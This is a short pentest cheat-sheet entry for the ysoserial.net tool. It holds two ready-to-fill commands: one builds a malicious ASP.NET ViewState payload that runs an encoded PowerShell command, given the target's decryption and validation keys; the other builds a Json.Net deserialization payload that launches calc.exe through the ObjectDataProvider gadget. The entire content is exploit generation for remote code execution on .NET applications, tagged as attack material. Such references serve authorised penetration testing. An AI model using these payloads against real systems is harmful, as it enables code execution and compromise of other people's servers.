# ysoserial.net

% .net, unserialize

## ysoserial.net - generate payload VIEWSTATE
#plateform/windows #target/local #cat/ATTACK/GENERATE_PAYLOAD 
```cmd
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell -EncodedCommand <base64_encoded_command>" --path="<asp_file_webroot_relative_path>" --apppath="<application_path_webroot_relative>" --decryptionalg="3DES" --decryptionkey="<decryption_key>" --validationalg="SHA1" --validationkey="<validation_state>"
```

## ysoserial.net - calc.exe payload for Json.Net using ObjectDataProvider gadget.
#plateform/windows #target/local #cat/ATTACK/GENERATE_PAYLOAD 
```cmd
ysoserial.exe -f <lib|Json.Net> -g <gadget|ObjectDataProvider> -o raw -c "<command|calc.exe>" -t
```


